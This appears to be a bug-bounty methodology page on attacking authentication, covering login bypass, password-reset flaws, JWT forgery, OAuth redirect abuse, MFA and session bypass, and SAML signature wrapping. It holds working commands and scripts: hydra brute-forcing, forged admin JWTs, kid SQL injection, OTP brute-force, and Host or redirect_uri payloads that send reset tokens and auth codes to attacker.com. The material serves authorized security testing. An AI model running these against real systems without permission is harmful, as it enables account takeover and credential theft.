---
icon: lucide/user-round-key
tags:
  - authentication
  - session
  - jwt
  - oauth
  - bug-bounty
description: Authentication is the front door. Session management is the lock on every door inside. Bugs here lead directly to account takeover.
---

# Authentication

Authentication is the front door. Session management is the lock on every door inside. Bugs here have the highest direct impact — account takeover, privilege escalation, full application compromise. Always test auth flows manually. Scanners miss most of these.

---

<div class="grid cards" markdown>

-   :material-login:{ .lg .middle } __2.1 Auth Bypass__

    ---

    Logic flaws, default credentials, response manipulation. Test before any technical attack.

    [:octicons-arrow-right-24: Start here](#21-authentication-bypass)

-   :material-lock-reset:{ .lg .middle } __2.2 Password Reset__

    ---

    Token predictability, Host header injection, reuse, expiry, enumeration.

    [:octicons-arrow-right-24: Reset flaws](#22-password-reset-flaws)

-   :material-key-variant:{ .lg .middle } __2.3 JWT Attacks__

    ---

    Algorithm confusion, alg:none, weak secrets, kid injection, claim tampering.

    [:octicons-arrow-right-24: JWT](#23-jwt-attacks)

-   :simple-oauth:{ .lg .middle } __2.4 OAuth 2.0__

    ---

    Redirect URI bypass, CSRF via missing state, code interception, account mislink.

    [:octicons-arrow-right-24: OAuth](#24-oauth-20-flaws)

-   :material-two-factor-authentication:{ .lg .middle } __2.5 MFA Bypass__

    ---

    Rate limit absent, response manipulation, direct navigation, backup code abuse.

    [:octicons-arrow-right-24: MFA](#25-multi-factor-authentication-bypass)

-   :material-cookie:{ .lg .middle } __2.6 Session Management__

    ---

    Fixation, post-logout validity, cookie flags, entropy analysis.

    [:octicons-arrow-right-24: Sessions](#26-session-management)

-   :material-shield-account:{ .lg .middle } __2.7 SSO / SAML__

    ---

    XML signature wrapping, signature removal, audience bypass, timestamp bypass.

    [:octicons-arrow-right-24: SAML](#27-single-sign-on-sso--saml-flaws)

</div>

---

## Decision Flow

```
App uses JWTs for auth?
→ Decode immediately. Check alg, check claims. Run 2.3 checklist.

App has "Login with Google/GitHub"?
→ OAuth flow present. Run 2.4 checklist before anything else.

App has enterprise SSO / SAML?
→ Install SAML Raider, run all 8 XSW variants.

Found admin panel during recon?
→ Default credentials first (2.1.2). Takes 2 minutes.

MFA present on login?
→ Test rate limiting on OTP, test direct navigation past MFA step.

Time-constrained?
→ Auth bypass (2.1) → password reset (2.2) → JWT if tokens present (2.3)
```

---

## 2.1 Authentication Bypass

### 2.1.1 Login Logic Flaws

**When to use:** On every login endpoint, before any technical attack. Test the logic first — applications often implement auth checks incorrectly at the code level.

**Tests to run on every login form:**

```
1. Submit empty credentials → session issued or error?
2. Submit valid username + empty password → logs in?
3. Submit username with leading/trailing whitespace → matches?
4. Submit username as array: username[]=admin&password=x  (PHP type juggling)
5. Submit JSON with NoSQL operator:
   {"username":"admin","password":{"$gt":""}}
6. Change POST to GET → does login still process?
7. Submit with Content-Type: text/plain → still processed?
```

**Case sensitivity bypass** — many apps store usernames lowercase but compare case-insensitively:

```
Admin    ADMIN    admin    admin<space>    admin\n
```

```bash title="burp_workflow"
# 1. Intercept login request
# 2. Send to Repeater
# 3. Systematically test each variation above
# Watch for: different response size, different redirect, session cookie issued
```

!!! warning "200 ≠ failure"
    Many apps return `200 {"success": false}`. Always read the full response body — never triage by status code alone on login endpoints.

!!! tip "Account lockout"
    If the program has aggressive lockout, note the threshold first and stay well below it. Locking out real users is out-of-scope behavior.

---

### 2.1.2 Default Credentials

**When to use:** On any admin panel, internal tool, or third-party component found during recon. Especially common on staging environments.

| Service | Credentials to Try |
|---|---|
| Jenkins | `admin:admin`, `admin:password`, blank password |
| Grafana | `admin:admin` |
| Kibana | No auth by default (pre-7.x) |
| phpMyAdmin | `root:` (empty), `root:root` |
| Tomcat Manager | `admin:admin`, `tomcat:tomcat`, `admin:tomcat` |
| Spring Boot Actuator | No auth — just access `/actuator/env` |
| Jupyter Notebook | No auth by default |
| MongoDB | No auth by default (older installs) |
| Redis | No auth by default |
| Elasticsearch | No auth by default (pre-8.x) |

```bash title="default_creds_test.sh"
# Manual test first — 5 to 10 combinations, not automated sweeps
# Only run hydra if the program explicitly allows credential testing

hydra -l admin \
  -P /opt/SecLists/Passwords/Default-Credentials/default-passwords.txt \
  https-form-post://target.com/login \
  "username=^USER^&password=^PASS^:Invalid credentials" \
  -t 4 -w 3
```

!!! danger "If you get in"
    Screenshot the panel. Do not make changes. Report immediately. Accessing an admin panel via default credentials is Critical on most programs.

---

### 2.1.3 Response Manipulation

**When to use:** On any app that makes auth decisions based on a server response value, especially SPAs (React, Angular, Vue) where the frontend drives navigation.

```
Normal flow:
→ POST /login {username, password}
← 200 {"success": false, "redirect": null}
→ Browser stays on login page

Manipulated:
→ POST /login {username, password}
← intercept response → change "false" to "true"
← 200 {"success": true, "redirect": "/dashboard"}
→ Does the browser now grant access?
```

```bash title="burp_match_replace"
# Proxy → Options → Match and Replace
# Add rule: Response body
# Match:   success\":false
# Replace: success\":true

# Or intercept manually:
# Proxy → Intercept → "Intercept responses to this request"
```

**Other response values to manipulate:**

```json
{"authenticated": false}  →  {"authenticated": true}
{"role": "user"}          →  {"role": "admin"}
{"mfa_required": true}    →  {"mfa_required": false}
{"account_locked": true}  →  {"account_locked": false}
{"verified": false}       →  {"verified": true}
```

!!! info "Persistence caveat"
    If the server re-validates on subsequent requests, response manipulation won't give persistent access — but it still demonstrates the flaw and is worth reporting. Impact depends on what the manipulated response unlocks.

---

## 2.2 Password Reset Flaws

Password reset is one of the most consistently vulnerable features in web apps. It involves generating a secret, transmitting it, and validating it on use. Each step can fail.

### 2.2.1 Token Predictability

**When to use:** On every password reset implementation. Request multiple tokens and analyze for patterns before testing anything else.

```bash title="token_analysis.sh"
# Request 5-10 reset tokens for your own test account
# Collect tokens from emails, then analyze:

# Sequential?
# Token 1: reset_1001
# Token 2: reset_1002 → trivially predictable

# Time-based?
# Token: 1714000000abc → decode the timestamp portion
echo "1714000000" | date -d @1714000000

# MD5/SHA1 of predictable input?
echo -n "admin@target.com" | md5sum
echo -n "admin@target.com$(date +%Y%m%d)" | md5sum
```

**Token quality reference:**

| Type | Example | Verdict |
|---|---|---|
| Sequential | `reset_1001`, `reset_1002` | Broken |
| Date + email | `20260429-admin@target.com` | Broken |
| MD5 of email | `5f4dcc3b5aa765d61d8327deb882cf99` | Broken |
| 6-digit OTP, no rate limit | `482910` | Brute-forceable |
| 64-char random alphanumeric | `a9f2c...` | Secure |
| Signed JWT, short expiry | `eyJ...` | Secure (if impl is correct) |

---

### 2.2.2 Host Header Injection

**When to use:** On every forgot-password flow. One of the highest-yield tests relative to effort — takes 5 minutes and regularly produces High/Critical findings.

Many apps generate the reset link by reading the `Host` header from the request without validating it. The victim receives a reset email pointing to the attacker's server.

```http title="basic_host_swap"
POST /forgot-password HTTP/1.1
Host: attacker.com

email=victim@target.com
```

**All variations to test:**

```http title="host_injection_variants"
# X-Forwarded-Host (bypasses Host validation more often than direct swap)
Host: target.com
X-Forwarded-Host: attacker.com

# X-Host
X-Host: attacker.com

# Forwarded header
Forwarded: host=attacker.com

# Port confusion
Host: target.com:@attacker.com

# Subdomain confusion
Host: attacker.com.target.com
```

```bash title="burp_workflow"
# 1. Forgot password page → intercept POST
# 2. Replace Host with Burp Collaborator URL
# 3. Forward request
# 4. Check Collaborator for incoming HTTP request containing the reset token

# Free alternative to Collaborator:
interactsh-client -server interactsh.com
```

**What to include in report:**
- Collaborator interaction showing the token arriving at your server
- Screenshot of the victim's email showing your domain in the reset link

---

### 2.2.3 Token Reuse and Expiry

**When to use:** After confirming a token exists and works. Run all five tests.

```
1. Token reuse after use
   → Use the token, then try using the same token again
   → Expected: invalidated. Works again → report it.

2. Token doesn't expire
   → Request token, wait 24 hours, use it
   → Expected: expired. Still works → report it.

3. Old token not invalidated when new one is requested
   → Request Token A, then request Token B
   → Try Token A → should fail. Works → report it.

4. Token not bound to account
   → Request reset for Account A (get token)
   → Submit token with Account B's email in the form
   → Expected: validation fails. Allows password change → ATO.

5. Token leaks via Referer
   → After clicking reset link, navigate to an external link
   → Check if Referer header contains the token (requires token in URL query param)
```

---

### 2.2.4 Username Enumeration

**When to use:** On every forgot-password, login, and registration endpoint. They often behave differently from each other.

```bash title="enumeration_test.sh"
# Compare responses for registered vs unregistered email
# Look for: different message, different response size, different timing

# ffuf automated check
ffuf -u https://target.com/forgot-password \
  -X POST \
  -d "email=FUZZ@target.com" \
  -w /opt/SecLists/Usernames/top-usernames-shortlist.txt \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -mr "sent" \
  -o enum_results.txt

# Timing oracle
for email in admin@target.com fake12345@notreal.com; do
  time curl -s -X POST https://target.com/forgot-password \
    -d "email=$email" > /dev/null
done
# Significant difference = timing oracle
```

!!! info "Severity context"
    Username enumeration alone is P4/Informational on most programs. The exception: healthcare, finance, or any app where confirming a user exists has real-world sensitivity (e.g. a mental health platform). Always check login, registration, and forgot-password separately — they often behave differently.

---

## 2.3 JWT Attacks

JSON Web Tokens are used as session tokens, API auth tokens, and inter-service credentials. A broken JWT implementation can mean full authentication bypass or privilege escalation without a password. JWT bugs are common because the spec has dangerous optional features that developers implement incorrectly.

```bash title="decode_jwt.sh"
# Decode header
echo "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9" | base64 -d
# {"alg":"HS256","typ":"JWT"}

# Decode payload
echo "eyJ1c2VyX2lkIjoxMjMsInJvbGUiOiJ1c2VyIn0" | base64 -d
# {"user_id":123,"role":"user"}
```

### 2.3.1 Algorithm Confusion (RS256 → HS256)

**The attack:** When a server uses RS256 (asymmetric — signs with private key, verifies with public key), switch the algorithm to HS256. If the server then uses its public key as the HMAC secret, you can forge tokens signed with the public key — which is, by definition, public.

```python title="algorithm_confusion.py"
import jwt

# 1. Get public key from /.well-known/jwks.json or /api/keys
public_key = """-----BEGIN PUBLIC KEY-----
MIIBIjANBgkJh...
-----END PUBLIC KEY-----"""

# 2. Forge token with HS256, signed with the public key as secret
forged_payload = {"user_id": 1, "role": "admin"}
forged_token = jwt.encode(forged_payload, public_key, algorithm="HS256")
print(forged_token)
```

```bash title="jwt_tool_alg_confusion.sh"
# Automated — detect and test confusion
python3 jwt_tool.py <token> -X a -pk public_key.pem

# Full attack scan
python3 jwt_tool.py <token> -M at \
  -pk public_key.pem \
  -t "https://target.com/api/protected" \
  -rh "Authorization: Bearer JWT_HERE"
```

---

### 2.3.2 `alg: none` Bypass

**The attack:** The JWT spec allows `"alg": "none"` — no signature required. A vulnerable server accepts any unsigned token.

```bash title="alg_none.sh"
# Encode modified header with alg:none
echo -n '{"alg":"none","typ":"JWT"}' | base64 | tr '+/' '-_' | tr -d '='
# eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0

# Encode modified payload
echo -n '{"user_id":1,"role":"admin"}' | base64 | tr '+/' '-_' | tr -d '='

# Final token — empty signature (trailing dot required)
# eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.<payload>.

# With jwt_tool (automated):
python3 jwt_tool.py <token> -X n
```

---

### 2.3.3 Weak Secret Brute-Force

**When to use:** On any HS256/HS384/HS512 token. If the secret is short, a common word, or a default like `secret` or `password`, it can be cracked offline and used to forge arbitrary tokens.

=== "hashcat (GPU)"

    ```bash title="hashcat_jwt.sh"
    hashcat -a 0 -m 16500 \
      <jwt_token> \
      /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt
    ```

=== "john (CPU)"

    ```bash title="john_jwt.sh"
    john --wordlist=/opt/SecLists/Passwords/Leaked-Databases/rockyou.txt \
      --format=HMAC-SHA256 jwt.txt
    ```

=== "jwt_tool"

    ```bash title="jwt_tool_crack.sh"
    python3 jwt_tool.py <token> -C \
      -d /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt
    ```

**Try these manually before running hashcat:**

```
secret  password  key  jwt  token  admin  test  123456
your-256-bit-secret  your-secret-key  changeme  default
```

```python title="forge_after_crack.py"
import jwt
secret = "cracked_secret"
forged = jwt.encode({"user_id": 1, "role": "admin"}, secret, algorithm="HS256")
# Use in Authorization: Bearer <forged>
```

---

### 2.3.4 `kid` Header Injection

**The attack:** The `kid` (key ID) header tells the server which key to use for verification. If used in a SQL query or file path without sanitization — SQL injection or path traversal — you can control which key the server uses to verify your forged token.

=== "SQL injection"

    ```bash title="kid_sqli.sh"
    # Inject via kid header:
    # {"alg":"HS256","kid":"' UNION SELECT 'attacker_secret' -- -"}
    # Server uses 'attacker_secret' as signing key
    # Sign token with same secret → forge arbitrary claims

    python3 jwt_tool.py <token> -I -hc kid \
      -hv "' UNION SELECT 'pwned' -- -" \
      -S hs256 -p "pwned"
    ```

=== "Path traversal"

    ```bash title="kid_traversal.sh"
    # {"alg":"HS256","kid":"../../dev/null"}
    # Server reads /dev/null (empty) as key
    # Sign token with empty string

    python3 jwt_tool.py <token> -I -hc kid \
      -hv "../../dev/null" \
      -S hs256 -p ""
    ```

---

### 2.3.5 Claim Tampering

**When to use:** Always — test whether the server validates claims at all before doing anything complex. Many apps don't verify signatures server-side.

```bash title="claim_tamper.sh"
# Tamper role (no re-signing — test if signature is validated at all)
python3 jwt_tool.py <token> -I -pc role -pv admin

# Tamper user ID
python3 jwt_tool.py <token> -I -pc user_id -pv 1

# Expiry bypass
python3 jwt_tool.py <token> -I -pc exp -pv 9999999999

# Tamper + test against live endpoint
python3 jwt_tool.py <token> -I -pc role -pv admin \
  -t "https://target.com/api/admin" \
  -rh "Authorization: Bearer JWT_HERE" \
  -S hs256 -p "known_secret"
```

**Claims worth targeting:**

| Claim | Attack |
|---|---|
| `role`, `user_role`, `is_admin` | Privilege escalation |
| `user_id`, `sub`, `uid` | IDOR / ATO |
| `email` | Account switch |
| `exp` | Expiry bypass |
| `scope` | Permission expansion |
| `org_id`, `tenant_id` | Tenant isolation bypass |

---

### 2.3.6 JWT Checklist

```
□ Decode and read all claims — what's in the payload?
□ alg:none accepted?
□ RS256 → HS256 confusion possible? (get public key from JWKS endpoint first)
□ Weak secret — hashcat + rockyou
□ kid header: SQL injection
□ kid header: path traversal
□ Claims validated server-side? (tamper role/id without valid signature)
□ exp enforced? (use expired token)
□ Token works across different hosts/subdomains?
□ Token in a URL anywhere? (log/referer leakage)
```

---

## 2.4 OAuth 2.0 Flaws

OAuth is the auth delegation standard powering "Login with Google/GitHub/Facebook." Its complexity — multiple flows, multiple actors, multiple redirect hops — creates a wide attack surface. OAuth bugs regularly lead to full account takeover with no user interaction beyond clicking a malicious link.

**Quick flow recap:**

```
1. User clicks "Login with Google"
2. App redirects → GET /auth?client_id=X&redirect_uri=https://target.com/callback&state=Y
3. User approves → Google redirects → https://target.com/callback?code=AUTH_CODE&state=Y
4. App exchanges: POST /token {code, client_id, client_secret}
5. App fetches user info with access token → logs user in

Every step is an attack surface.
```

### 2.4.1 Redirect URI Bypass

**The attack:** If the OAuth provider validates `redirect_uri` loosely, an attacker can redirect the authorization code to their own server — stealing it and completing the OAuth flow as the victim.

```
Registered URI: https://target.com/callback

# Path traversal
https://target.com/callback/../../../attacker.com

# Open redirect chain
https://target.com/redirect?url=https://attacker.com

# Subdomain confusion
https://attacker.com.target.com/callback
https://target.com.attacker.com/callback

# Parameter pollution
redirect_uri=https://target.com/callback&redirect_uri=https://attacker.com

# Weak prefix/suffix matching
https://target.com.evil.com/callback
https://target.com/callbackX

# Encoded characters
https://target.com%2Fattacker.com/callback
https://target.com%40attacker.com/callback
```

```bash title="burp_workflow"
# 1. Click "Login with OAuth provider"
# 2. Intercept the redirect to provider's /auth endpoint
# 3. Modify redirect_uri using variations above
# 4. Set up Burp Collaborator / interactsh to receive callbacks
# 5. If provider accepts modified URI → code arrives at your server
# 6. Exchange: POST /token {code, client_id, client_secret, redirect_uri}
# 7. Use returned token → screenshot of ATO
```

---

### 2.4.2 State Parameter Bypass (CSRF → ATO)

**The attack:** The `state` parameter is OAuth's CSRF token. If absent or not validated, an attacker can force-complete an OAuth flow in a victim's session — linking the attacker's OAuth identity to the victim's account.

```
Tests:
1. Remove state= entirely → does provider accept?
2. Intercept callback, change state value → does app verify it matches?
3. Reuse a state value from a previous flow → does it work again?
```

**The CSRF ATO chain:**

```
1. Attacker starts OAuth login → gets authorization URL with code
2. Stops before completing the callback step
3. Sends victim: target.com/callback?code=ATTACKER_CODE&state=anything
4. Victim (logged in) visits URL → app links attacker's OAuth to victim's account
5. Attacker logs in via OAuth → now has victim's account
```

---

### 2.4.3 Authorization Code Interception

```
1. Referer leakage
   → Callback page loads third-party resources
   → DevTools → Network → check Referer headers on any third-party requests
   → If Referer contains ?code= → code is leaking

2. Open redirect chains with code
   → target.com/callback?code=X redirects to external URL
   → Code appears in Referer of that redirect

3. Code reuse
   → Capture a valid code, use it, try using it again
   → Second use succeeds → codes not invalidated on use
```

---

### 2.4.4 Account Takeover via OAuth Mislink

**The attack:** When an app creates/links accounts based on email from the OAuth provider without verifying ownership of that email, an attacker can pre-register a victim's email to hijack their future OAuth login.

```
1. Register on target.com with victim@gmail.com (no email verification)
2. Victim clicks "Login with Google" using victim@gmail.com
3. App sees email match → links or merges accounts
4. Attacker controls the account

Test both directions:
- Register first → OAuth login with same email
- OAuth login first → register with same email
- Link social account to existing account (is ownership verified?)
```

!!! danger "Highest-impact OAuth bug, most overlooked"
    Test this on any app with both password login and social login. The fix requires verifying email ownership — many apps skip this entirely.

---

### 2.4.5 OAuth Checklist

```
□ redirect_uri strict validation? All bypass patterns from 2.4.1
□ state present and validated on callback?
□ OAuth flow CSRF-able? (force victim to complete attacker's flow)
□ Auth code in Referer to third-party resources?
□ Auth code single-use and short-lived?
□ Pre-register with victim email before OAuth (2.4.4)?
□ App verifies email from OAuth provider, or trusts it blindly?
□ Open redirect on callback page chainable with code theft?
□ client_secret visible in client-side JS? (should be server-side only)
```

---

## 2.5 Multi-Factor Authentication Bypass

### 2.5.1 OTP Brute-Force

**When to use:** On any 6-digit numeric OTP. A 6-digit OTP has 1,000,000 combinations. Without rate limiting or lockout, it's brute-forceable. Test first: attempt 10 consecutive wrong codes — if no lockout, proceed.

=== "Burp Intruder"

    ```bash title="intruder_otp.sh"
    # 1. Log in with valid credentials → reach MFA prompt
    # 2. Intercept OTP submission → Send to Intruder
    # 3. Mark OTP field as payload position
    # 4. Payload: Numbers 000000–999999
    # 5. Watch for different response length/redirect on valid code
    ```

=== "Turbo Intruder"

    ```python title="turbo_intruder_otp.py"
    def queueRequests(target, wordlists):
        engine = RequestEngine(endpoint=target.endpoint, concurrentConnections=5)
        for otp in range(1000000):
            engine.queue(target.req, str(otp).zfill(6))

    def handleResponse(req, interesting):
        if "dashboard" in req.response or "Welcome" in req.response:
            table.add(req)
    ```

---

### 2.5.2 Response Manipulation

```
1. Submit wrong OTP code
2. Intercept server response: {"mfa_valid": false}
3. Modify to: {"mfa_valid": true}
4. Forward → does app grant access?

Request-side tests too:
- Add header: X-MFA-Bypass: true
- Add parameter: &skip_mfa=true
- Modify body: {"otp": "000000", "skip": true}
```

---

### 2.5.3 MFA Skip via Direct Navigation

**When to use:** After completing password auth but before submitting an OTP. Tests whether MFA is enforced server-side or only client-side.

```bash title="mfa_skip.sh"
# 1. Log in with valid credentials (password auth complete)
# 2. When redirected to MFA page, DO NOT submit a code
# 3. Directly navigate to protected pages:
curl -H "Cookie: session=<partial_auth_cookie>" https://target.com/dashboard
curl -H "Cookie: session=<partial_auth_cookie>" https://target.com/api/v1/user/profile

# If data returns → API layer doesn't enforce MFA
```

---

### 2.5.4 Backup Code and Recovery Abuse

```
□ Backup code rate limiting: try 10 wrong codes → lockout?
□ Backup code reuse: use a valid code, try again → should fail
□ Recovery flow bypasses MFA: does "forgot authenticator" skip MFA entirely?
□ Password reset → login without MFA?
  (if reset logs you in directly → MFA bypassed for any resettable account)
```

---

## 2.6 Session Management

### 2.6.1 Session Fixation

**When to use:** On every login. Takes 30 seconds to test.

```bash title="session_fixation.sh"
# Note session token before login
curl -sc pre_login_cookies.txt https://target.com/ > /dev/null
PRE=$(grep -i session pre_login_cookies.txt | awk '{print $NF}')

# Log in
curl -sc post_login_cookies.txt \
  -d "username=test&password=test" \
  https://target.com/login > /dev/null
POST=$(grep -i session post_login_cookies.txt | awk '{print $NF}')

# Compare
[ "$PRE" = "$POST" ] && echo "VULNERABLE: session token unchanged after login"
```

---

### 2.6.2 Session Not Invalidated on Logout

```bash title="session_post_logout.sh"
# 1. Log in → copy session cookie
# 2. Log out normally
# 3. Replay saved cookie

curl -H "Cookie: session=<saved_value>" https://target.com/api/user
# Returns authenticated data → server-side session not invalidated

# Extended tests:
# - Change password → old session still valid?
# - Change email → old session still valid?
# - Deactivate account → active sessions still work?
```

---

### 2.6.3 Cookie Security Flags

```bash title="cookie_flags_check.sh"
curl -sv https://target.com/ 2>&1 | grep -i "set-cookie"
# Expected: Set-Cookie: session=X; Secure; HttpOnly; SameSite=Strict
```

| Flag | Absent Risk | Exploitability |
|---|---|---|
| `Secure` | Cookie sent over HTTP | Requires network position |
| `HttpOnly` | `document.cookie` readable | Requires XSS |
| `SameSite` | Cookie sent cross-site | Requires CSRF vector |

!!! info "Standalone flags are Low severity"
    Missing cookie flags are Low/Informational on most programs. Report as part of an exploit chain — not standalone — unless the program specifically rewards them.

---

### 2.6.4 Session Token Entropy

=== "Burp Sequencer"

    ```
    Proxy → Sequencer → Live capture → select session token response
    Collect 200+ tokens → Run analysis
    Result under 80 effective entropy bits → report as weak entropy
    ```

=== "Manual"

    ```bash title="entropy_manual.sh"
    for i in {1..10}; do
      curl -sc /tmp/c$i.txt -d "u=test&p=test" https://target.com/login > /dev/null
      grep -i session /tmp/c$i.txt | awk '{print $NF}'
    done
    # Red flags: sequential values, timestamps, < 32 chars, predictable patterns
    ```

---

## 2.7 Single Sign-On (SSO) / SAML Flaws {#27-single-sign-on-sso--saml-flaws}

### 2.7.1 XML Signature Wrapping (XSW)

**The attack:** XML signature validation and XML parsing can operate on different elements. XSW inserts a forged assertion alongside a legitimately signed one — the signature validates (it's real) but the app processes the forged element.

=== "SAML Raider (Burp)"

    ```
    1. Install SAML Raider via BApp Store
    2. Log in via SSO → intercept the SAML Response POST
    3. Send to SAML Raider tab
    4. Use "XSW Attacks" → generates all 8 XSW variants automatically
    5. Test each → watch for successful auth as different user
    ```

=== "Manual"

    ```bash title="saml_manual.sh"
    # Decode SAML response (it's base64)
    echo "<b64_value>" | base64 -d > saml.xml

    # Edit saml.xml:
    # - Change NameID to target user
    # - Add wrapping structure around forged assertion

    # Re-encode
    base64 -w0 saml.xml
    # Replace in request and forward
    ```

---

### 2.7.2 Signature Removal and Replay

```
1. Remove <Signature> block entirely from SAML response
   → Re-encode and forward → app accepts unsigned assertion?

2. Replay a captured SAML response in a new session
   → Different browser/IP → accepted?
   (proper impl checks InResponseTo ID + NotOnOrAfter timestamp)

3. Modify NameID without valid signature
   → Change to admin@target.com → accepted?
```

---

### 2.7.3 Audience and Timestamp Bypass

```
1. Audience bypass
   → Complete SSO on app-a.target.com → capture SAML response
   → Submit same response to app-b.target.com's ACS endpoint
   → Does app-b accept a response intended for app-a?

2. Timestamp bypass
   → Does app enforce NotBefore / NotOnOrAfter?
   → Use an expired SAML response → still accepted?

3. InResponseTo bypass
   → Does app validate that InResponseTo matches a real SP-initiated request?
   → Submit IdP-initiated assertion → accepted without a corresponding SP request?
```

---

## Part 2 Complete Checklist

??? note "Expand full checklist"

    ```
    AUTH BYPASS
    □ Empty credentials, array input, Content-Type variation, method swap
    □ Default credentials on admin panels found via recon
    □ Response manipulation: false → true on auth decision

    PASSWORD RESET
    □ Token entropy: collect 5+ tokens, check for patterns
    □ Host header injection: Host, X-Forwarded-Host, X-Host, Forwarded
    □ Token reuse after use
    □ Token still valid after 24 hours
    □ Old token valid after new one requested
    □ Token bound to wrong account (account A token used for account B)
    □ Username enumeration via response or timing difference

    JWT
    □ Decode and read all claims
    □ alg:none accepted?
    □ RS256 → HS256 confusion (get public key from JWKS endpoint)
    □ Weak secret: hashcat + rockyou
    □ kid SQLi and path traversal
    □ Claim tampering without valid signature

    OAUTH
    □ redirect_uri: all bypass patterns from 2.4.1
    □ state present, validated, not reusable
    □ Auth code in Referer to third parties
    □ Auth code single-use
    □ Pre-register with victim email before OAuth
    □ Account linking logic tested both directions

    MFA
    □ OTP rate limiting (10 attempts → lockout?)
    □ Response manipulation on MFA step
    □ Direct navigation past MFA after password auth
    □ API endpoints accessible with partial-auth session
    □ Backup code reuse and rate limiting
    □ Recovery/reset flow that skips MFA

    SESSION
    □ Token unchanged after login (fixation)
    □ Session valid after logout
    □ Session valid after password/email change
    □ Cookie flags: Secure, HttpOnly, SameSite
    □ Token entropy via Burp Sequencer

    SSO / SAML
    □ All 8 XSW variants via SAML Raider
    □ Signature removed entirely → still accepted?
    □ Response replayed in new session
    □ NameID modified without signature
    □ Audience bypass across services
    □ NotBefore/NotOnOrAfter enforcement
    ```

---

## References

<div class="grid cards" markdown>

-   :simple-portswigger: __PortSwigger Labs__

    ---

    - [Authentication](https://portswigger.net/web-security/authentication)
    - [OAuth](https://portswigger.net/web-security/oauth)
    - [JWT (all 8 labs)](https://portswigger.net/web-security/jwt)
    - [Host header attacks](https://portswigger.net/web-security/host-header)

-   :octicons-tools-16: __Tools__

    ---

    - [jwt_tool](https://github.com/ticarpi/jwt_tool)
    - [SAML Raider (BApp)](https://portswigger.net/bappstore/c61cfa893bb14db4b01775554f7b802e)
    - [Burp JWT Editor (BApp)](https://portswigger.net/bappstore/26aaa5ded2f74beea19e2ed8345a93dd)
    - [interactsh](https://github.com/projectdiscovery/interactsh)

-   :octicons-book-16: __References__

    ---

    - [jwt_tool wiki](https://github.com/ticarpi/jwt_tool/wiki)
    - [OWASP JWT cheatsheet](https://cheatsheetseries.owasp.org/cheatsheets/JSON_Web_Token_for_Java_Cheat_Sheet.html)
    - [OWASP SAML cheatsheet](https://cheatsheetseries.owasp.org/cheatsheets/SAML_Security_Cheat_Sheet.html)
    - [PayloadsAllTheThings — Auth bypass](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Authentication%20Bypass)

</div>